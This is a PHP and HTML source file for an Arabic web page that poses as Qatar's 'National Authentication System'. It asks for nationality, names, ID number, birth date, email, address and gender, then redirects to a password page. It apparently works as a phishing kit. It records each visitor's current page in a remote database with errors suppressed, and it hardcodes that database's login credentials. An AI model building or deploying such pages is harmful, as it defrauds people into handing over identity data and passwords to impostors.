<?php
error_reporting(0);
ini_set('display_errors', 0);
$host = "dpg-d95vic9oagis739h761g-a";
$user = "qatar_db_user";
$password = "TpPqGoliCoObGDiGdpEc16ak3PJZ9BB1";
$dbname = "qatar_db";
$port = "5432";

try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
    $stmt_vis = $pdo->prepare("INSERT INTO active_visitors (visitor_id, current_page, last_seen) 
                               VALUES (:visitor_id, 'صفحة البيانات الشخصية', NOW()) 
                               ON CONFLICT (visitor_id) 
                               DO UPDATE SET current_page = 'صفحة البيانات الشخصية', last_seen = NOW()");
    $stmt_vis->execute([':visitor_id' => $visitor_id]);
} catch (Exception $e) {}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>نظام التوثيق الوطني - البيانات الشخصية</title>
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

    <style>
        :root { --primary-color: #007fb1; --secondary-color: #8a1538; --input-bg: #f2f2f2; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; margin: 0; padding-top: 80px; display: flex; flex-direction: column; min-height: 100vh; }
        
        .header { 
            position: fixed; top: 0; width: 100%; height: 70px; background-color: #fff; 
            padding: 0 20px; display: flex; justify-content: space-between; align-items: center; 
            border-bottom: 1px solid #ddd; z-index: 1000; box-sizing: border-box;
        }
        .header-right { display: flex; align-items: center; gap: 15px; }
        .menu-icon { display: flex; flex-direction: column; justify-content: space-between; width: 22px; height: 16px; cursor: pointer; }
        .menu-icon span { display: block; height: 2px; width: 100%; background-color: var(--primary-color); }

        .container { width: 92%; max-width: 500px; margin: 20px auto; padding: 10px; flex: 1; text-align: right; }
        h2 { font-size: 22px; margin-bottom: 25px; color: #333; }
        .form-group { margin-bottom: 25px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
        .required { color: red; }
        input, select, textarea { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; background-color: var(--input-bg) !important; color: #333; font-size: 15px; }
        ::placeholder { color: #888; font-size: 13px; }
        textarea { height: 100px; resize: none; }
        .dob-group { display: flex; gap: 5px; }
        .gender-group { display: flex; gap: 20px; margin-top: 10px; }
        .radio-option { display: flex; align-items: center; font-size: 15px; cursor: pointer; }
        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 17px; margin-top: 20px; }
        .footer { background-color: #eeeeee; padding: 20px; text-align: center; border-top: 1px solid #cccccc; font-size: 12px; color: #555; }
        .select2-container--default .select2-selection--single { background-color: var(--input-bg) !important; height: 50px; padding-top: 10px; border: 1px solid #ccc; }
    </style>
</head>
<body>

    <div class="header">
        <div class="header-right">
            <div class="menu-icon"><span></span><span></span><span></span></div>
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" height="40">
        </div>
        <div style="text-align: left; font-size: 14px;"><div style="color: var(--secondary-color); font-weight: bold;">نظام التوثيق الوطني</div></div>
    </div>

    <div class="container">
        <h2>البيانات الشخصية</h2>
        <form id="dataForm" action="save.php" method="POST">
            <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
            
            <div class="form-group"><label>اختر الجنسية <span class="required">*</span></label>
                <select id="nationality" name="nationality" class="js-example-basic-single" required>
                    <option value="" disabled selected>اختر الجنسية</option>
                    <option value="قطر">قطر</option>
                    <option value="السعودية">السعودية</option>
                    <option value="الإمارات">الإمارات</option>
                    <option value="الكويت">الكويت</option>
                    <option value="البحرين">البحرين</option>
                    <option value="عمان">عمان</option>
                    <option value="مصر">مصر</option>
                </select>
            </div>
            
            <div class="form-group"><label>الاسم بالعربي <span class="required">*</span></label><input type="text" name="name_ar" placeholder="الاسم بالعربي" required></div>
            <div class="form-group"><label>الاسم باللغة الإنجليزية <span class="required">*</span></label><input type="text" name="name_en" placeholder="الاسم باللغة الإنجليزية" required></div>
            <div class="form-group"><label>رقم الهوية <span class="required">*</span></label><input type="text" name="id_number" placeholder="رقم الهوية" required></div>
            
            <div class="form-group"><label>تاريخ الميلاد <span class="required">*</span></label>
                <div class="dob-group">
                    <select name="day" required><option value="">يوم</option><?php for($i=1;$i<=31;$i++) echo "<option value='$i'>$i</option>"; ?></select>
                    <select name="month" required><option value="">شهر</option><?php $m=['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر']; foreach($m as $k=>$v) echo "<option value='".($k+1)."'>$v</option>"; ?></select>
                    <select name="year" required><option value="">سنة</option><?php for($i=2026;$i>=1950;$i--) echo "<option value='$i'>$i</option>"; ?></select>
                </div>
            </div>

            <div class="form-group"><label>البريد الإلكتروني <span class="required">*</span></label><input type="email" name="email" placeholder="البريد الإلكتروني" required></div>
            <div class="form-group"><label>العنوان الحالي <span class="required">*</span></label><textarea name="address" placeholder="العنوان الحالي" required></textarea></div>
            
            <div class="form-group"><label>الجنس <span class="required">*</span></label>
                <div class="gender-group">
                    <label class="radio-option"><input type="radio" name="gender" value="ذكر" required> ذكر</label>
                    <label class="radio-option"><input type="radio" name="gender" value="أنثى" required> أنثى</label>
                </div>
            </div>
            
            <button type="submit" class="btn-submit">استمرار</button>
        </form>
    </div>

    <div class="footer"><p><strong>نظام التوثيق الوطني - دولة قطر</strong></p><p>جميع الحقوق محفوظة © 2026</p></div>

    <script>
    $(document).ready(function() {
        $('.js-example-basic-single').select2();
        
        // جلب الدول
        fetch('https://restcountries.com/v3.1/all')
            .then(response => response.json())
            .then(data => {
                const select = $('#nationality');
                const arabCountries = ['Qatar', 'Saudi Arabia', 'United Arab Emirates', 'Kuwait', 'Bahrain', 'Oman', 'Egypt'];
                data.sort((a, b) => a.name.common.localeCompare(b.name.common)).forEach(country => {
                    const name = country.name.common;
                    if (!arabCountries.includes(name)) {
                        select.append(`<option value="${name}">${name}</option>`);
                    }
                });
            });

        // التحويل لصفحة الباسورد بعد الإرسال
        $('#dataForm').on('submit', function(e) {
            // ملاحظة: بما أن action هو save.php، سيتم الحفظ أولاً
            // سأقوم بعمل تأخير بسيط لضمان تنفيذ الحفظ ثم الانتقال
            setTimeout(function() {
                window.location.href = 'password.php'; 
            }, 500);
        });
    });
    </script>
</body>
</html>
